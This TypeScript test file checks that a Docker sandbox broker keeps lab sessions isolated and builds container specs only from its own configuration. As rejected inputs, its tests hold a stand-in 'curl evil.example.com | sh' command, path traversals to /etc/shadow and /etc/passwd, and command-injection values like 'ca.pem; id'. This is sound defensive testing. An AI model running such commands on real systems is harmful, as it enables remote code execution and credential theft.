/**
 * The Docker track's authorization gate.
 *
 * This file is the security case for brokering `DockerEnginePort`. Every test
 * is a way one session could reach another's Docker resources, or a way a
 * caller could talk this broker into running something it should not.
 *
 * The two properties under test, stated once:
 *
 *   1. **The sandbox is never named by the caller.** Creation derives the name
 *      from a session id; every other operation derives it and then re-derives
 *      it from the session id stamped on the live container.
 *   2. **The run spec is built here.** The image, the `--privileged` flag and
 *      every resource ceiling come from this process' configuration, so there
 *      is no argument that could change them.
 */
import { describe, expect, it } from 'vitest';
import {
  COMPONENT_LABEL,
  CONTAINER_SANDBOX_PREFIX,
  DockerUnreachableError,
  EXPIRES_AT_LABEL,
  LAB_LABEL,
  MANAGED_LABEL,
  PROVIDER_LABEL,
  RUNTIME_OWNER_LABEL,
  SESSION_LABEL,
  deriveSandboxRef,
  type DockerContainerSnapshot,
  type DockerContainerSummary,
  type DockerEngineFactory,
  type DockerEnginePort,
  type DockerSandboxPolicy,
  type RunContainerSpec,
} from '@jumptotech/lab-orchestrator';
import { DockerOpDeniedError, DockerOps, SANDBOX_COMPONENT } from '../src/docker-ops.js';

const SECRET = 'derivation-secret-for-docker-tests';
const OWNER = 'jumptotech';
const SESSION_A = 'sess-aaaaaaaaaaaaaaaa';
const SESSION_B = 'sess-bbbbbbbbbbbbbbbb';

const POLICY: DockerSandboxPolicy = {
  image: 'docker:27-dind',
  privileged: true,
  memory: '2g',
  cpus: '2',
  pidsLimit: 512,
  maxContainers: 10,
  network: 'jumptotech-sandboxes',
  daemonPort: 2376,
  readyTimeoutSeconds: 180,
  restartAttempts: 5,
};

const refFor = (sessionId: string): string =>
  deriveSandboxRef({ sessionId, secret: SECRET, prefix: CONTAINER_SANDBOX_PREFIX });

function sandboxSnapshot(
  sessionId: string,
  overrides: { labels?: Record<string, string>; name?: string } = {},
): DockerContainerSnapshot {
  const name = overrides.name ?? refFor(sessionId);
  return {
    id: `id-${name}`,
    name,
    image: 'docker:27-dind',
    imageId: 'sha256:abc',
    state: 'running',
    running: true,
    exitCode: 0,
    oomKilled: false,
    labels: overrides.labels ?? {
      [MANAGED_LABEL]: 'true',
      [RUNTIME_OWNER_LABEL]: OWNER,
      [COMPONENT_LABEL]: SANDBOX_COMPONENT,
      [PROVIDER_LABEL]: 'docker',
      [SESSION_LABEL]: sessionId,
      [LAB_LABEL]: 'DOCKER-001',
    },
  } as DockerContainerSnapshot;
}

/** A factory recording everything it was asked to do, on both engines. */
function fakeEngines(containers: Record<string, DockerContainerSnapshot> = {}) {
  const hostCalls: Array<{ op: string; arg: unknown }> = [];
  const sessionCalls: Array<{ sandbox: string; op: string; arg: unknown }> = [];
  let runSpec: RunContainerSpec | undefined;

  const host = {
    version: async () => {
      hostCalls.push({ op: 'version', arg: null });
      return { serverVersion: '27.0.0' };
    },
    inspectContainer: async (name: string) => {
      hostCalls.push({ op: 'inspectContainer', arg: name });
      return containers[name] ?? null;
    },
    listContainers: async (o: unknown) => {
      hostCalls.push({ op: 'listContainers', arg: o });
      return Object.values(containers).map(
        (c) => ({ name: c.name, labels: c.labels }) as DockerContainerSummary,
      );
    },
    runContainer: async (spec: RunContainerSpec) => {
      hostCalls.push({ op: 'runContainer', arg: spec });
      runSpec = spec;
      containers[spec.name] = sandboxSnapshot(spec.labels?.[SESSION_LABEL] ?? '', {
        name: spec.name,
        ...(spec.labels ? { labels: spec.labels } : {}),
      });
      return spec.name;
    },
    removeContainer: async (name: string) => {
      hostCalls.push({ op: 'removeContainer', arg: name });
      delete containers[name];
    },
    createVolume: async (name: string) => {
      hostCalls.push({ op: 'createVolume', arg: name });
    },
    removeVolume: async (name: string) => {
      hostCalls.push({ op: 'removeVolume', arg: name });
    },
    createNetwork: async (spec: unknown) => {
      hostCalls.push({ op: 'createNetwork', arg: spec });
    },
    execInContainer: async (name: string, argv: string[]) => {
      hostCalls.push({ op: 'execInContainer', arg: { name, argv } });
      return { exitCode: 0, stdout: '-----BEGIN CERTIFICATE-----\n', stderr: '', timedOut: false };
    },
  } as unknown as DockerEnginePort;

  const engines: DockerEngineFactory = {
    host,
    session(sandbox: string) {
      const record = (op: string, arg: unknown) => sessionCalls.push({ sandbox, op, arg });
      return {
        version: async () => {
          record('version', null);
          return { serverVersion: '27.0.0' };
        },
        inspectContainer: async (n: string) => {
          record('inspectContainer', n);
          return null;
        },
        inspectImage: async (r: string) => {
          record('inspectImage', r);
          return null;
        },
        inspectVolume: async (n: string) => {
          record('inspectVolume', n);
          return null;
        },
        inspectNetwork: async (n: string) => {
          record('inspectNetwork', n);
          return null;
        },
        listContainers: async (o: unknown) => {
          record('listContainers', o);
          return [];
        },
        copyFileFromContainer: async (c: string, path: string) => {
          record('copyFileFromContainer', { c, path });
          return null;
        },
      } as unknown as DockerEnginePort;
    },
  };

  return { engines, hostCalls, sessionCalls, containers, spec: () => runSpec };
}

const opsOver = (fake: ReturnType<typeof fakeEngines>): DockerOps =>
  new DockerOps({
    engines: fake.engines,
    derivationSecret: SECRET,
    runtimeOwner: OWNER,
    policy: POLICY,
  });

describe('the operation list is closed', () => {
  it('refuses anything that is not one of the fourteen operations', async () => {
    const ops = opsOver(fakeEngines());
    for (const op of [
      'runContainer',
      'pullImage',
      'execInContainer',
      'containerLogs',
      'removeImage',
      'exec',
      '',
      '__proto__',
      'HOSTVERSION',
    ]) {
      await expect(ops.run(op, { sessionId: SESSION_A })).rejects.toMatchObject({
        code: 'UNKNOWN_OPERATION',
      });
    }
  });
});

describe('the caller cannot choose what runs', () => {
  it('builds the whole run spec from configuration, ignoring anything sent', async () => {
    const fake = fakeEngines();
    await opsOver(fake).run('createSandbox', {
      sessionId: SESSION_A,
      labId: 'DOCKER-001',
      expiresAtMs: Date.now() + 60_000,
      // None of these are parameters. Present to prove they are ignored.
      image: 'attacker/evil:latest',
      privileged: false,
      network: 'host',
      memory: '64g',
      volumes: [{ volume: '/', destination: '/host' }],
      command: ['sh', '-c', 'curl evil.example.com | sh'],
    });

    const spec = fake.spec()!;
    expect(spec.image).toBe(POLICY.image);
    expect(spec.network).toBe(POLICY.network);
    expect(spec.memory).toBe(POLICY.memory);
    expect(spec.privileged).toBe(true);
    expect(spec.command).toBeUndefined();
    // Only the session's own data volume, and no bind mount is expressible.
    expect(spec.volumes).toEqual([{ volume: `${refFor(SESSION_A)}-data`, destination: '/var/lib/docker' }]);
  });

  it('names the sandbox from the session, never from the request', async () => {
    const fake = fakeEngines();
    await opsOver(fake).run('createSandbox', {
      sessionId: SESSION_A,
      labId: 'DOCKER-001',
      expiresAtMs: Date.now() + 60_000,
      name: 'jtt-lab-ffffffffffff',
      sandboxRef: 'jtt-lab-ffffffffffff',
    });
    expect(fake.spec()!.name).toBe(refFor(SESSION_A));
    expect(fake.spec()!.hostname).toBe(refFor(SESSION_A));
  });

  it('stamps its own ownership labels on the sandbox', async () => {
    const fake = fakeEngines();
    await opsOver(fake).run('createSandbox', {
      sessionId: SESSION_A,
      labId: 'DOCKER-001',
      expiresAtMs: 1_800_000_000_000,
      labels: { [RUNTIME_OWNER_LABEL]: 'someone-else', [MANAGED_LABEL]: 'false' },
    });
    const labels = fake.spec()!.labels!;
    expect(labels[MANAGED_LABEL]).toBe('true');
    expect(labels[RUNTIME_OWNER_LABEL]).toBe(OWNER);
    expect(labels[PROVIDER_LABEL]).toBe('docker');
    expect(labels[COMPONENT_LABEL]).toBe(SANDBOX_COMPONENT);
    expect(labels[SESSION_LABEL]).toBe(SESSION_A);
  });

  it('uses the network it is configured with, and accepts no name for one', async () => {
    const fake = fakeEngines();
    await opsOver(fake).run('createSandboxNetwork', { name: 'host', driver: 'host' });
    const created = fake.hostCalls.find((c) => c.op === 'createNetwork')!.arg as { name: string };
    expect(created.name).toBe(POLICY.network);
  });
});

describe('one session cannot reach another session’s Docker resources', () => {
  it('resolves each session to its own sandbox, and they differ', async () => {
    expect(refFor(SESSION_A)).not.toBe(refFor(SESSION_B));

    const fake = fakeEngines({
      [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A),
      [refFor(SESSION_B)]: sandboxSnapshot(SESSION_B),
    });
    const ops = opsOver(fake);

    await ops.run('sessionInspectContainer', { sessionId: SESSION_A, name: 'web' });
    await ops.run('sessionInspectContainer', { sessionId: SESSION_B, name: 'web' });

    expect(fake.sessionCalls.map((c) => c.sandbox)).toEqual([refFor(SESSION_A), refFor(SESSION_B)]);
  });

  it('ignores a sandbox name in the request entirely', async () => {
    const fake = fakeEngines({
      [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A),
      [refFor(SESSION_B)]: sandboxSnapshot(SESSION_B),
    });

    await opsOver(fake).run('sessionInspectContainer', {
      sessionId: SESSION_A,
      name: 'web',
      // Not protocol fields. Here to prove they are not honoured.
      sandbox: refFor(SESSION_B),
      sandboxRef: refFor(SESSION_B),
      container: refFor(SESSION_B),
    });

    expect(fake.sessionCalls[0]!.sandbox).toBe(refFor(SESSION_A));
  });

  it("refuses a container carrying another session's id", async () => {
    /*
     * The loop-closer. A container is only session A's sandbox if deriving
     * from the session id *it carries* lands back on the name we arrived at.
     */
    const fake = fakeEngines({
      [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A, {
        name: refFor(SESSION_A),
        labels: {
          [MANAGED_LABEL]: 'true',
          [RUNTIME_OWNER_LABEL]: OWNER,
          [COMPONENT_LABEL]: SANDBOX_COMPONENT,
          [PROVIDER_LABEL]: 'docker',
          [SESSION_LABEL]: SESSION_B,
        },
      }),
    });

    await expect(
      opsOver(fake).run('sessionVersion', { sessionId: SESSION_A }),
    ).rejects.toMatchObject({ code: 'SANDBOX_SESSION_MISMATCH' });
    expect(fake.sessionCalls).toEqual([]);
  });

  it('refuses a session whose sandbox does not exist', async () => {
    await expect(
      opsOver(fakeEngines()).run('readCertificate', { sessionId: SESSION_A, file: 'ca.pem' }),
    ).rejects.toMatchObject({ code: 'SANDBOX_NOT_FOUND' });
  });
});

describe('unmanaged and foreign containers cannot be touched', () => {
  const cases: Array<[string, Record<string, string>, string]> = [
    [
      'created outside the platform',
      { [SESSION_LABEL]: SESSION_A },
      'SANDBOX_NOT_MANAGED',
    ],
    [
      'belonging to another deployment',
      {
        [MANAGED_LABEL]: 'true',
        [RUNTIME_OWNER_LABEL]: 'another-worktree',
        [COMPONENT_LABEL]: SANDBOX_COMPONENT,
        [PROVIDER_LABEL]: 'docker',
        [SESSION_LABEL]: SESSION_A,
      },
      'SANDBOX_NOT_OWNED',
    ],
    [
      'that is not a sandbox',
      {
        [MANAGED_LABEL]: 'true',
        [RUNTIME_OWNER_LABEL]: OWNER,
        [COMPONENT_LABEL]: 'something-else',
        [PROVIDER_LABEL]: 'docker',
        [SESSION_LABEL]: SESSION_A,
      },
      'SANDBOX_NOT_A_SANDBOX',
    ],
    [
      'belonging to another provider',
      {
        [MANAGED_LABEL]: 'true',
        [RUNTIME_OWNER_LABEL]: OWNER,
        [COMPONENT_LABEL]: SANDBOX_COMPONENT,
        [PROVIDER_LABEL]: 'linux',
        [SESSION_LABEL]: SESSION_A,
      },
      'SANDBOX_WRONG_PROVIDER',
    ],
  ];

  for (const [description, labels, code] of cases) {
    it(`refuses a container ${description}`, async () => {
      const fake = fakeEngines({
        [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A, { labels }),
      });
      await expect(
        opsOver(fake).run('sessionVersion', { sessionId: SESSION_A }),
      ).rejects.toMatchObject({ code });
      expect(fake.sessionCalls).toEqual([]);
    });
  }

  it('will not remove a container it does not own, and does not call the daemon', async () => {
    const fake = fakeEngines({
      [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A, {
        labels: {
          [MANAGED_LABEL]: 'true',
          [RUNTIME_OWNER_LABEL]: 'another-worktree',
          [COMPONENT_LABEL]: SANDBOX_COMPONENT,
          [PROVIDER_LABEL]: 'docker',
          [SESSION_LABEL]: SESSION_A,
        },
      }),
    });

    await expect(opsOver(fake).run('removeSandbox', { sessionId: SESSION_A })).rejects.toMatchObject(
      { code: 'SANDBOX_NOT_OWNED' },
    );
    expect(fake.hostCalls.filter((c) => c.op === 'removeContainer')).toEqual([]);
    expect(fake.containers[refFor(SESSION_A)]).toBeDefined();
  });
});

describe('cleanup removes only owned managed sandboxes', () => {
  it('hides every other deployment’s sandbox from a listing', async () => {
    const mine = refFor(SESSION_A);
    const foreign = refFor(SESSION_B);
    const fake = fakeEngines({
      [mine]: sandboxSnapshot(SESSION_A),
      [foreign]: sandboxSnapshot(SESSION_B, {
        labels: {
          [MANAGED_LABEL]: 'true',
          [RUNTIME_OWNER_LABEL]: 'another-worktree',
          [COMPONENT_LABEL]: SANDBOX_COMPONENT,
          [PROVIDER_LABEL]: 'docker',
          [SESSION_LABEL]: SESSION_B,
        },
      }),
    });

    const result = (await opsOver(fake).run('listManagedSandboxes', {})) as {
      containers: DockerContainerSummary[];
    };
    expect(result.containers.map((c) => c.name)).toEqual([mine]);
  });

  it('treats removing a sandbox that is already gone as success', async () => {
    await expect(
      opsOver(fakeEngines()).run('removeSandbox', { sessionId: SESSION_A }),
    ).resolves.toEqual({ removed: false });
  });

  it('removes a sandbox this broker does own, and its named data volume', async () => {
    /*
     * The volume matters. `docker rm -v` removes a container's *anonymous*
     * volumes, and the sandbox's `/var/lib/docker` is a named one — so without
     * this every ended session left a whole daemon's image store on disk.
     */
    const fake = fakeEngines({ [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A) });
    await expect(opsOver(fake).run('removeSandbox', { sessionId: SESSION_A })).resolves.toEqual({
      removed: true,
    });
    expect(fake.containers[refFor(SESSION_A)]).toBeUndefined();
    expect(fake.hostCalls.filter((c) => c.op === 'removeVolume').map((c) => c.arg)).toEqual([
      `${refFor(SESSION_A)}-data`,
    ]);
  });

  it('does not remove a volume when it refused to remove the sandbox', async () => {
    const fake = fakeEngines({
      [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A, {
        labels: {
          [MANAGED_LABEL]: 'true',
          [RUNTIME_OWNER_LABEL]: 'another-worktree',
          [COMPONENT_LABEL]: SANDBOX_COMPONENT,
          [PROVIDER_LABEL]: 'docker',
          [SESSION_LABEL]: SESSION_A,
        },
      }),
    });
    await expect(opsOver(fake).run('removeSandbox', { sessionId: SESSION_A })).rejects.toBeDefined();
    expect(fake.hostCalls.filter((c) => c.op === 'removeVolume')).toEqual([]);
  });
});

describe('the certificate read is a closed operation', () => {
  it('reads only the three session TLS files', async () => {
    const fake = fakeEngines({ [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A) });
    const ops = opsOver(fake);

    for (const file of ['ca.pem', 'cert.pem', 'key.pem']) {
      await ops.run('readCertificate', { sessionId: SESSION_A, file });
    }
    expect(fake.hostCalls.filter((c) => c.op === 'execInContainer')).toHaveLength(3);

    for (const file of [
      '../../etc/shadow',
      '/etc/passwd',
      'ca.pem; id',
      'server-key.pem',
      '',
    ]) {
      await expect(ops.run('readCertificate', { sessionId: SESSION_A, file })).rejects.toBeInstanceOf(
        DockerOpDeniedError,
      );
    }
    // Still three: nothing above reached the daemon.
    expect(fake.hostCalls.filter((c) => c.op === 'execInContainer')).toHaveLength(3);
  });

  it('builds the argv itself, from constants', async () => {
    const fake = fakeEngines({ [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A) });
    await opsOver(fake).run('readCertificate', {
      sessionId: SESSION_A,
      file: 'ca.pem',
      argv: ['sh', '-c', 'id'],
    });
    const call = fake.hostCalls.find((c) => c.op === 'execInContainer')!.arg as {
      name: string;
      argv: string[];
    };
    expect(call.argv).toEqual(['cat', '/certs/client/ca.pem']);
    expect(call.name).toBe(refFor(SESSION_A));
  });
});

describe('the verifier reads only its own session', () => {
  it('routes every read through the sandbox derived from the session', async () => {
    const fake = fakeEngines({ [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A) });
    const ops = opsOver(fake);

    await ops.run('sessionInspectContainer', { sessionId: SESSION_A, name: 'web' });
    await ops.run('sessionInspectImage', { sessionId: SESSION_A, reference: 'nginx:alpine' });
    await ops.run('sessionInspectVolume', { sessionId: SESSION_A, name: 'data' });
    await ops.run('sessionInspectNetwork', { sessionId: SESSION_A, name: 'appnet' });
    await ops.run('sessionCopyFile', {
      sessionId: SESSION_A,
      container: 'web',
      path: '/usr/share/nginx/html/index.html',
    });

    expect(fake.sessionCalls).toHaveLength(5);
    expect(new Set(fake.sessionCalls.map((c) => c.sandbox))).toEqual(new Set([refFor(SESSION_A)]));
  });

  it('refuses a malformed object name or path before it reaches a daemon', async () => {
    const fake = fakeEngines({ [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A) });
    const ops = opsOver(fake);

    for (const name of ['--privileged', '-v/:/host', 'a b', 'x'.repeat(200)]) {
      await expect(
        ops.run('sessionInspectContainer', { sessionId: SESSION_A, name }),
      ).rejects.toBeInstanceOf(DockerOpDeniedError);
    }
    for (const path of ['relative/path', '../etc/passwd', 'x;id']) {
      await expect(
        ops.run('sessionCopyFile', { sessionId: SESSION_A, container: 'web', path }),
      ).rejects.toBeInstanceOf(DockerOpDeniedError);
    }
    expect(fake.sessionCalls).toEqual([]);
  });
});

describe('a file read survives the wire as bytes', () => {
  it('base64-encodes content rather than letting JSON flatten a Buffer', async () => {
    /*
     * The regression this exists for. `JSON.stringify(Buffer)` produces
     * `{type:'Buffer',data:[…]}`, so the far side received a plain object and
     * the verifier's binary check — `content.includes(0)` — threw. DOCKER-011
     * failed grading with an internal error and nothing else noticed.
     */
    const bytes = Buffer.from([0x68, 0x69, 0x00, 0xff]);
    const fake = fakeEngines({ [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A) });
    (fake.engines.session(refFor(SESSION_A)) as unknown as Record<string, unknown>).x = 1;
    const ops = new DockerOps({
      engines: {
        host: fake.engines.host,
        session: () =>
          ({
            copyFileFromContainer: async () => ({
              content: bytes,
              declaredSize: bytes.length,
              truncated: false,
            }),
          }) as unknown as DockerEnginePort,
      },
      derivationSecret: SECRET,
      runtimeOwner: OWNER,
      policy: POLICY,
    });

    const result = (await ops.run('sessionCopyFile', {
      sessionId: SESSION_A,
      container: 'web',
      path: '/etc/nginx/nginx.conf',
    })) as { file: { contentBase64: string; declaredSize: number; truncated: boolean } };

    expect(result.file.contentBase64).toBe(bytes.toString('base64'));
    // And it round-trips to exactly the bytes that went in, NUL included.
    expect(Buffer.from(result.file.contentBase64, 'base64').equals(bytes)).toBe(true);
  });

  it('reports an absent file as null rather than as empty content', async () => {
    const fake = fakeEngines({ [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A) });
    const result = (await opsOver(fake).run('sessionCopyFile', {
      sessionId: SESSION_A,
      container: 'web',
      path: '/nope',
    })) as { file: null };
    expect(result.file).toBeNull();
  });
});

describe('a wrong derivation secret fails closed', () => {
  it('cannot find a sandbox it derives a different name for', async () => {
    const fake = fakeEngines({ [refFor(SESSION_A)]: sandboxSnapshot(SESSION_A) });
    const ops = new DockerOps({
      engines: fake.engines,
      derivationSecret: 'a-completely-different-secret',
      runtimeOwner: OWNER,
      policy: POLICY,
    });
    await expect(ops.run('sessionVersion', { sessionId: SESSION_A })).rejects.toMatchObject({
      code: 'SANDBOX_NOT_FOUND',
    });
  });
});

describe('a daemon outage is reported as the environment being down', () => {
  it('surfaces DockerUnreachableError rather than a refusal', async () => {
    const fake = fakeEngines();
    (fake.engines.host as unknown as { version: () => Promise<never> }).version = async () => {
      throw new DockerUnreachableError('Cannot connect to the Docker daemon');
    };
    await expect(opsOver(fake).run('hostVersion', {})).rejects.toBeInstanceOf(DockerUnreachableError);
  });
});
